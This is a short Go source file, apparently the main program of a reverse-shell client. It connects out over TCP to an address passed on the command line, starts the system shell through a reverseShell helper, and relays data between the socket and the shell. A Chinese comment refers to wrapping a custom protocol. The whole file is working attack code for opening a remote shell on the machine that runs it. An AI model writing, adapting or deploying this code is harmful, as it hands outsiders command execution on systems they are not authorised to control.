package main

import (
	"io"
	"log"
	"net"
	"os"
)

func main() {
	send := make(chan []byte)
	recv := make(chan []byte)
	conn, err := net.Dial("tcp", os.Args[1])
	if nil == err {
		defer conn.Close()
		shellPath := GetSystemShell()
		go reverseShell(shellPath, send, recv)
		go func() {
			for {
				data := make([]byte, readBufSize)
				read, err := conn.Read(data)
				if err != nil {
					if err != io.EOF {
						log.Printf("conn.Read is err: %v \n", err)
					}
					continue
				}
				if 0 < read {
					recv <- data
				}
			}
		}()
	} else {
		log.Printf("net.Dial is err: %v \n", err)
	}
	for {
		select {
		case outgoing := <-send:
			// 包装自定义协议
			conn.Write(outgoing)
		}
	}

}
